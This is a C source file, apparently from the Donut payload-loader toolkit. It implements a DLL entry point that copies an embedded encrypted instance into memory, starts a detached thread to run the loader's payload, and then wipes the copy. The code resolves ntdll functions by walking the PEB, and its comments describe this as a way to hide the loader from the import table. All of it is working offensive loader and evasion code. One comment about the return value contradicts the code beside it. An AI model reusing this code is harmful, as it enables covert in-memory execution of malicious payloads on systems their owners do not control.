/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

/* DLL host entry point.
 *
 * DllMain runs under the loader lock, so it does only what cannot wait: copy
 * the embedded instance into writable memory and create one detached worker.
 * Waiting, joining or calling into the payload here would deadlock another
 * thread's LoadLibrary.
 *
 * The instance in the image is const. The loader's contract treats its
 * instance as owned and mutable (bootstrap decrypts in place and the cleanup
 * path wipes it), so it must never see the const image: the worker hands it a
 * writable copy and releases that copy when the loader returns. */

#include "loader.h"
#include "instance.h"

void DonutLoader(PDONUT_INSTANCE inst);

static SIZE_T         dll_instance_len;

/* Resolve one ntdll export through the PEB. The DLL is linked freestanding
 * (-nostdlib) and ntdll is always present, so this avoids an import table
 * entry that would name the loader at rest. */
static LPVOID dll_get_proc(const char *fn) {
    PPEB                 peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
    PLDR_DATA_TABLE_ENTRY dte;
    PIMAGE_DOS_HEADER    dos;
    PIMAGE_NT_HEADERS    nt;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD               names, funcs;
    PWORD                ords;
    DWORD                i;

    for(dte = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;
        dte && dte->DllBase; dte = (PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink) {
        PWSTR b = dte->BaseDllName.Buffer;
        const char *want = "ntdll.dll";
        uint32_t j = 0;
        if(b == NULL) continue;
        while(want[j]) {
            uint16_t c = b[j];
            if(c >= 'A' && c <= 'Z') c = (uint16_t)(c + ('a' - 'A'));
            if(c != (uint16_t)want[j]) break;
            j++;
        }
        if(want[j] == 0 && b[j] == 0) {
            HMODULE base = (HMODULE)dte->DllBase;
            dos = (PIMAGE_DOS_HEADER)base;
            nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
            if(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
                return NULL;
            exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base,
                         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            names = RVA2VA(PDWORD, base, exp->AddressOfNames);
            ords  = RVA2VA(PWORD,  base, exp->AddressOfNameOrdinals);
            funcs = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
            for(i = 0; i < exp->NumberOfNames; i++) {
                const char *p = RVA2VA(const char*, base, names[i]);
                uint32_t k = 0;
                while(p[k] && fn[k] && p[k] == fn[k]) k++;
                if(p[k] == 0 && fn[k] == 0)
                    return RVA2VA(LPVOID, base, funcs[ords[i]]);
            }
            return NULL;
        }
    }
    return NULL;
}

static DWORD WINAPI dll_worker(LPVOID param) {
    NtFreeVirtualMemory_t _free;
    PDONUT_INSTANCE       inst = (PDONUT_INSTANCE)param;
    PVOID                 base;
    SIZE_T                size = 0;

    /* The exit option stays DONUT_OPT_EXIT_THREAD, so DonutLoader returns
     * after the payload thread has been started or the payload has run. */
    DonutLoader(inst);

    Memset(inst, 0, (unsigned int)dll_instance_len);
    _free = (NtFreeVirtualMemory_t)dll_get_proc("NtFreeVirtualMemory");
    if(_free != NULL) {
        base = inst;
        _free((HANDLE)-1, &base, &size, MEM_RELEASE);
    }

    /* 2 proves DonutLoader returned on this thread and cleanup completed. */
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE module, DWORD reason, LPVOID reserved) {
    NtAllocateVirtualMemory_t _alloc;
    NtCreateThreadEx_t        _thread;
    PVOID                     copy = NULL;
    SIZE_T                    size = sizeof(homer_instance);
    HANDLE                    thread = NULL;

    (void)module;
    (void)reserved;

    if(reason != DLL_PROCESS_ATTACH) return TRUE;

    _alloc  = (NtAllocateVirtualMemory_t)dll_get_proc("NtAllocateVirtualMemory");
    _thread = (NtCreateThreadEx_t)dll_get_proc("NtCreateThreadEx");
    if(_alloc == NULL || _thread == NULL) return FALSE;

    if(_alloc((HANDLE)-1, &copy, 0, &size, MEM_COMMIT | MEM_RESERVE,
              PAGE_READWRITE) != 0 || copy == NULL) {
        return FALSE;
    }
    dll_instance_len = size;
    Memcpy(copy, homer_instance, (unsigned int)sizeof(homer_instance));

    if(_thread(&thread, 0x1FFFFF, NULL, (HANDLE)-1, dll_worker, copy,
               0, 0, 0, 0, NULL) != 0) {
        NtFreeVirtualMemory_t _free =
            (NtFreeVirtualMemory_t)dll_get_proc("NtFreeVirtualMemory");
        PVOID base = copy;
        SIZE_T release = 0;
        Memset(copy, 0, (unsigned int)dll_instance_len);
        if(_free != NULL) _free((HANDLE)-1, &base, &release, MEM_RELEASE);
        return FALSE;
    }
    return TRUE;
}
